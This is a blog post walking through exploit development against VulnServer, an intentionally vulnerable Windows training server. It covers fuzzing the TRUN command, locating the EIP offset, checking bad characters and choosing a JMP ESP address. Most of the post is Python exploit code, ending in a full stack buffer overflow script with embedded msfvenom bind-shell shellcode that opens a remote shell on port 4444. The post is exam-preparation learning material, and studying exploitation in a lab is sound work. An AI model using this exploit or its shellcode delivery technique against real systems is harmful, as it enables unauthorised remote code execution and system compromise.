---
layout: post
title:  "[VulnServer] Exploiting TRUN Command via Vanilla EIP Overwrite"
date:   2018-06-27
categories: exploitdev
description: "Exploitation of VulnServer's TRUN command using vanilla EIP overwrite method."
header-img: /static/img/2018-06-27-vulnserver-trun/04.png
image: /static/img/2018-06-27-vulnserver-trun/04.png
---

As part of my preparation for the taking the CTP course and OSCE exam, I decided to practice and hone my skills using [vulnserver.exe](http://www.thegreycorner.com/p/vulnserver.html). Based on the creator’s note:
> _Vulnserver is a Windows based threaded TCP server application that is designed to be exploited. The program is intended to be used as a learning tool to teach about the process of software exploitation, as well as a good victim program for testing new exploitation techniques and shellcode._

Before anything else, I first started exploring the application by connecting to it on port **9999/tcp**. Using the `HELP` command, all the available commands showed up. It can also be seen that all the commands (except from `HELP` and `EXIT`) only require one argument.
[![Vulnserver](/static/img/2018-06-27-vulnserver-trun/01.png)](/static/img/2018-06-27-vulnserver-trun/01.png)

Now that I already knew the available commands, I started fuzzing the `TRUN` command of the application using the following **SPIKE** template (`trun.spk`). *(Note: If you wanted to learn more about SPIKE, please read [this](https://resources.infosecinstitute.com/intro-to-fuzzing/).)*
```
s_readline();
s_string("TRUN ");
s_string_variable("FUZZ");
```

Using the template, I fuzzed the application for a short period of time using SPIKE’s **generic_send_tcp** interpreter.  
[![Spike](/static/img/2018-06-27-vulnserver-trun/02.png)](/static/img/2018-06-27-vulnserver-trun/02.png)

Looking back at the debugger, the application instantly crashed. From here, I observed that **EAX** stores the command (`TRUN`) and the string sent by the fuzzer (`/.:/ AAAAA...`). **ESP** and **EIP** were also overwritten with the fuzzed string.
[![Fuzz](/static/img/2018-06-27-vulnserver-trun/03.png)](/static/img/2018-06-27-vulnserver-trun/03.png)

To view the exact data sent by SPIKE, I opened up **Wireshark** and searched for the string `TRUN /.:/`, which was the string that was found stored in **EAX**.
[![Wireshark](/static/img/2018-06-27-vulnserver-trun/04.png)](/static/img/2018-06-27-vulnserver-trun/04.png)

Based on the TCP stream, the number of bytes that was sent by the fuzzer and that caused the crash was **around 5000 bytes**.
[![TCP Stream](/static/img/2018-06-27-vulnserver-trun/05.png)](/static/img/2018-06-27-vulnserver-trun/05.png)

To verify the buffer length that caused the crash, I’ve written the following python script, which contains **5000 bytes of A's**.
```
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.129"
port = 9999

buffer = "A"*5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```

Executing the python script successfully replicated the crash.
[![Crashed](/static/img/2018-06-27-vulnserver-trun/06.png)](/static/img/2018-06-27-vulnserver-trun/06.png)

The next step was to identify the four bytes that overwrote the **EIP** register. To do this, I first created a **unique string of 5000 bytes** using the **Mona** command `!mona pc 5000`.

Then used the unique pattern as the buffer - replacing the original 5000 bytes of A's.
```
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.129"
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```

After executing the updated script, the **EIP** was overwritten with `6F43376F`.
[![Unique String](/static/img/2018-06-27-vulnserver-trun/07.png)](/static/img/2018-06-27-vulnserver-trun/07.png)

To search the offset of the string that overwrote **EIP**, I used the following Mona command. The result showed that the offset was **2002 bytes**.
[![Offset](/static/img/2018-06-27-vulnserver-trun/08.png)](/static/img/2018-06-27-vulnserver-trun/08.png)

The exploit code was then updated to ensure that the offset was correct.
```
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.129"
port = 9999

buffer = "A"*2002
buffer += "BBBB"
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```

The updated script verified that the offset was correct. From here, it can be seen that **EIP** was overwritten with **4 B’s**. It can also be observed that the buffer of C’s, which overwrote ESP, was located directly after the 4 bytes of B’s. This was good news because I could simply place my shellcode right after the 4bytes of B’s.
[![EIP Overwrite](/static/img/2018-06-27-vulnserver-trun/09.png)](/static/img/2018-06-27-vulnserver-trun/09.png)

But before that, I needed first to identify the bad characters. To do this, I generated all possible characters, from `\x00` to `\xFF`, using the Mona command `!mona bytearray`. These characters were stored in the variable `badchars` and added to the buffer. *(Note: The character **NULL byte (`\x00`)** was already removed since it’s almost always a bad character.)
```
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.129"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*2002
buffer += "BBBB"
buffer += badchars
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```
After sending the updated buffer, the memory dump showed all the expected characters (`\x01` to `\xFF`). This means that the only bad character was the NULL byte (`\x00`).
[![Bad Char](/static/img/2018-06-27-vulnserver-trun/10.png)](/static/img/2018-06-27-vulnserver-trun/10.png)

The next step was to find an address which contains a `JMP ESP` instruction. It’s always recommended to use an address from the application itself, or the DLL that comes with the application. This is done for compatibility purposes - meaning that the exploit will work even if the application was installed on a different machine. For this instance, I only searched for a `JMP ESP` instruction from the **essfunc.dll** module that’s included with vulnserver.exe. I used the first address (`0x625011AF`) from the result of the Mona command `!mona jmp -r esp -m “essfunc.dll”`. This address was a good candidate since there’s no protection mechanism.  
[![JMP ESP](/static/img/2018-06-27-vulnserver-trun/11.png)](/static/img/2018-06-27-vulnserver-trun/11.png)

The next step was to generate a shellcode using MSFvenom.
[![Shellcode](/static/img/2018-06-27-vulnserver-trun/12.png)](/static/img/2018-06-27-vulnserver-trun/12.png)

Using all the information that I gathered (list of good characters, address containing a `JMP ESP` instruction, and shellcode), I modified the exploit code to the following. I also added a **nopsled** (16 NOP instructions) before the shellcode to give room for the decoder to do its work.
```
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.129"
port = 9999

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
# Payload size: 355 bytes
shellcode = ("\xdb\xcd\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x53\xbb\x44\xdc\x09"
"\x7b\x31\x5a\x17\x83\xc2\x04\x03\x1e\xcf\xeb\x8e\x62\x07\x69"
"\x70\x9a\xd8\x0e\xf8\x7f\xe9\x0e\x9e\xf4\x5a\xbf\xd4\x58\x57"
"\x34\xb8\x48\xec\x38\x15\x7f\x45\xf6\x43\x4e\x56\xab\xb0\xd1"
"\xd4\xb6\xe4\x31\xe4\x78\xf9\x30\x21\x64\xf0\x60\xfa\xe2\xa7"
"\x94\x8f\xbf\x7b\x1f\xc3\x2e\xfc\xfc\x94\x51\x2d\x53\xae\x0b"
"\xed\x52\x63\x20\xa4\x4c\x60\x0d\x7e\xe7\x52\xf9\x81\x21\xab"
"\x02\x2d\x0c\x03\xf1\x2f\x49\xa4\xea\x45\xa3\xd6\x97\x5d\x70"
"\xa4\x43\xeb\x62\x0e\x07\x4b\x4e\xae\xc4\x0a\x05\xbc\xa1\x59"
"\x41\xa1\x34\x8d\xfa\xdd\xbd\x30\x2c\x54\x85\x16\xe8\x3c\x5d"
"\x36\xa9\x98\x30\x47\xa9\x42\xec\xed\xa2\x6f\xf9\x9f\xe9\xe7"
"\xce\xad\x11\xf8\x58\xa5\x62\xca\xc7\x1d\xec\x66\x8f\xbb\xeb"
"\x89\xba\x7c\x63\x74\x45\x7d\xaa\xb3\x11\x2d\xc4\x12\x1a\xa6"
"\x14\x9a\xcf\x53\x1c\x3d\xa0\x41\xe1\xfd\x10\xc6\x49\x96\x7a"
"\xc9\xb6\x86\x84\x03\xdf\x2f\x79\xac\xce\xf3\xf4\x4a\x9a\x1b"
"\x51\xc4\x32\xde\x86\xdd\xa5\x21\xed\x75\x41\x69\xe7\x42\x6e"
"\x6a\x2d\xe5\xf8\xe1\x22\x31\x19\xf6\x6e\x11\x4e\x61\xe4\xf0"
"\x3d\x13\xf9\xd8\xd5\xb0\x68\x87\x25\xbe\x90\x10\x72\x97\x67"
"\x69\x16\x05\xd1\xc3\x04\xd4\x87\x2c\x8c\x03\x74\xb2\x0d\xc1"
"\xc0\x90\x1d\x1f\xc8\x9c\x49\xcf\x9f\x4a\x27\xa9\x49\x3d\x91"
"\x63\x25\x97\x75\xf5\x05\x28\x03\xfa\x43\xde\xeb\x4b\x3a\xa7"
"\x14\x63\xaa\x2f\x6d\x99\x4a\xcf\xa4\x19\x6a\x32\x6c\x54\x03"
"\xeb\xe5\xd5\x4e\x0c\xd0\x1a\x77\x8f\xd0\xe2\x8c\x8f\x91\xe7"
"\xc9\x17\x4a\x9a\x42\xf2\x6c\x09\x62\xd7")

buffer = "A"*2002
buffer += "\xAF\x11\x50\x62"        # 625011AF   JMP ESP from essfunc.dll
buffer += "\x90"*16                 # nopsled
buffer += shellcode
buffer += "C"*(5000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending exploit..."
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```
After running the final exploit code, the shellcode worked and the target machine opened up a “listening” port on **4444/tcp**.
[![Exploit](/static/img/2018-06-27-vulnserver-trun/13.png)](/static/img/2018-06-27-vulnserver-trun/13.png)

The last thing to do was to connect to the newly opened port to have a shell access.
[![Shell](/static/img/2018-06-27-vulnserver-trun/14.png)](/static/img/2018-06-27-vulnserver-trun/14.png)
